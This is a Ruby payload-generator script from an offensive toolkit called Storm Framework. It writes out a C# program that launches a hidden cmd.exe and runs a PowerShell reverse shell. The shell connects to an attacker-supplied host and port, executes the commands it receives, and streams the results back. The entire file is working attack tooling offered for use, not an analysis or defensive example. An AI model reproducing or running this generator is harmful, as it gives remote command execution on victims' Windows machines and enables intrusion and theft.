#!/usr/bin/env ruby

#            ---------------------------------------------------
#                             Storm Framework
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

e = "\033[1;31m[-] \033[0m"
p = "\033[1;77m[>] \033[0m"
g = "\033[1;34m[*] \033[0m"
s = "\033[1;32m[+] \033[0m"
h = "\033[1;77m[@] \033[0m"
r = "\033[1;77m[#] \033[0m"

require 'optparse'
require 'ostruct'

options = OpenStruct.new
OptionParser.new do |opt|
  opt.on('-h', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
  opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
  opt.on('-o', '--output-file <output_file>', 'Output file.') { |o| options.output_file = o }
end.parse!

host = options.local_host
port = options.local_port
file = options.output_file

if host == "" or port == "" or file == ""
    puts "Usage: csharp.rb --local-host=<local_host> --local-port=<local_port>"
    puts "                 --output-file=<output_file>"
    puts ""
    puts "  --local-host=<local_host>      Local host."
    puts "  --local-port=<local_port>      Local port."
    puts "  --output-file=<output_file>    Output file."
end
  
begin
    sleep(0.5)
    puts "#{g}Generating payload..."
    sleep(1)
    puts "#{g}Saving to #{file}..."
    sleep(0.5)
    open(file, 'w') { |f|
        f.puts "using System;"
        f.puts "using System.Diagnostics;"
        f.puts "namespace Templates"
        f.puts "{"
        f.puts "    class Payload"
        f.puts "    {"
        f.puts "        static void Main() {"
        f.puts "            Process command = new Process();"
        f.puts "            command.StartInfo.FileName = \"cmd.exe\";"
        f.puts "            command.StartInfo.RedirectStandardInput = true;"
        f.puts "            command.StartInfo.RedirectStandardOutput = true;"
        f.puts "            command.StartInfo.CreateNoWindow = true;"
        f.puts "            command.Start();"
        f.puts "            command.StandardInput.WriteLine(\"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(#{host},#{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\");"
        f.puts "            command.StandardInput.Flush();"
        f.puts "            command.StandardInput.Close();"
        f.puts "        }"
        f.puts "    }"
        f.puts "}"
    }
    puts "#{s}Saved to #{file}!"
rescue
    puts "#{e}Failed to generate payload!"
end
